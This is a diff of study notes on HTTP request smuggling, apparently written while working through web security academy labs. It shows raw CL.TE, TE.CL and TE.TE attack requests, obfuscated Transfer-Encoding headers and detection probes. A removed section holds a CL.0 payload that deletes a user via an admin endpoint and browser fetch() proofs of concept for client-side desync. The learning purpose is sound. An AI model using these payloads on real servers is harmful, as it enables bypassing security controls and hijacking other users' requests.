@@ -1,6 +1,7 @@
 HTTP/1 specification provides two different ways to specify where a request ends: 
 Content-Length header / Transfer-Encoding header
 
+
 POST /search HTTP/1.1
 Host: normal-website.com
 Content-Type: application/x-www-form-urlencoded
@@ -9,6 +10,7 @@ Transfer-Encoding: chunked
 b
 q=smuggling
 0
+
 
 Message body contains one or more chunks of data
 Each chunk consists of the chunk size in bytes (expressed in hexadecimal), followed by a newline, followed by the chunk contents
@@ -23,6 +25,7 @@ CL.TE: the front-end server uses the Content-Length header and the back-end serv
 TE.CL: the front-end server uses the Transfer-Encoding header and the back-end server uses the Content-Length header
 TE.TE: the front-end and back-end servers both use the Transfer-Encoding header, but one of them can be induced not to process it by obfuscating the header in some way
 
+
 CL.TE vulnerability:
 POST / HTTP/1.1
 Host: www.example.com
@@ -36,6 +39,7 @@ Transfer-Encoding: chunked
 G
 
 The second response should say: Unrecognized method GPOST
+
 
 TE.CL vulnerability:
 POST / HTTP/1.1
@@ -55,25 +59,21 @@ x=1
 You need to include the trailing sequence \r\n\r\n following the final 0
 The second response should say: Unrecognized method GPOST
 
+
 TE.TE behavior: obfuscating the TE header
 Example:
 Transfer-Encoding: xchunked
-
 Transfer-Encoding : chunked
-
 Transfer-Encoding: chunked
 Transfer-Encoding: x
-
 Transfer-Encoding:[tab]chunked
-
 [space]Transfer-Encoding: chunked
-
 X: X[\n]Transfer-Encoding: chunked
-
 Transfer-Encoding
 : chunked
 
 only one of the front-end or back-end servers processes it, while the other server ignores it
+
 
 POST / HTTP/1.1
 Host: YOUR-LAB-ID.web-security-academy.net
@@ -93,6 +93,7 @@ x=1
 You need to include the trailing sequence \r\n\r\n following the final 0
 The second response should say: Unrecognized method GPOST
 
+
 Finding CL.TE vulnerabilities using timing techniques:
 POST / HTTP/1.1
 Host: vulnerable-website.com
@@ -102,6 +103,7 @@ Content-Length: 4
 1
 A
 X
+
 
 Finding TE.CL vulnerabilities using timing techniques:
 POST / HTTP/1.1
@@ -113,10 +115,12 @@ Content-Length: 6
 
 X
 
+
 Confirming HTTP request smuggling vulnerabilities using differential responses:
 sending two requests to the application in quick succession
 1. An "attack" request that is designed to interfere with the processing of the next request
 2. A "normal" request
+
 
 Confirming CL.TE vulnerabilities using differential responses:
 POST / HTTP/1.1
@@ -131,6 +135,7 @@ GET /404 HTTP/1.1
 X-Ignore: X
 
 The second request should receive an HTTP 404 response
+
 
 Confirming TE.CL vulnerabilities using differential responses:
 POST / HTTP/1.1
@@ -147,64 +152,6 @@ Content-Length: 15
 x=1
 0
 
+
 Bypass front-end server security controls:
 
-
-Browser-powered request smuggling:
-
-CL.0 request smuggling:
-servers can be persuaded to ignore the Content-Length header
-If the back-end server exhibits this behavior, but the front-end still uses the Content-Length header to determine where the request ends
-this behavior on endpoints that simply aren't expecting POST requests, so they implicitly assume that no requests have a body
-Endpoints that trigger server-level redirects and requests for static files are prime candidates
-
-When a request's headers trigger a server error, some servers issue an error response without consuming the request body off the socket
-If they don't close the connection afterwards, this can provide an alternative CL.0 desync vector
-
-try using GET requests with an obfuscated Content-Length header
-
-POST /resources/images/blog.svg HTTP/1.1
-Host: YOUR-LAB-ID.web-security-academy.net
-Cookie: session=YOUR-SESSION-COOKIE
-Connection: keep-alive
-Content-Length: CORRECT
-
-GET /admin/delete?username=carlos HTTP/1.1
-Foo: x
-
-Client-side desync attacks:
-
-Probe for potential desync vectors in Burp
-sending a request in which the specified Content-Length is longer than the actual body
-elicit this behavior by triggering a server error
-Referer: https://evil-user.net/?%00
-Content-Type: application/x-www-form-urlencoded; charset=null, boundary=x
-GET /%2e%2e%2f HTTP/1.1
-
-Confirm the desync vector in Burp
-some secure servers respond without waiting for the body but still parse it correctly when it arrives
-Other servers don't handle the Content-Length correctly but close the connection immediately after responding, making them unexploitable
-
-Build a proof of concept to replicate the behavior in a browser
-fetch('https://vulnerable-website.com/vulnerable-endpoint', {
-    method: 'POST',
-    body: 'GET /hopefully404 HTTP/1.1\r\nFoo: x', // malicious prefix
-    mode: 'no-cors', // ensures the connection ID is visible on the Network tab
-    credentials: 'include' // poisons the "with-cookies" connection pool
-}).then(() => {
-    location = 'https://vulnerable-website.com/' // uses the poisoned connection
-})
-
-Handling redirects
-fetch('https://vulnerable-website.com/redirect-me', {
-    method: 'POST',
-    body: 'GET /hopefully404 HTTP/1.1\r\nFoo: x',
-    mode: 'cors',
-    credentials: 'include'
-}).catch(() => {
-    location = 'https://vulnerable-website.com/'
-})
-
-Identify an exploitable gadget
-Construct a working exploit in Burp
-Replicate the exploit in your browser
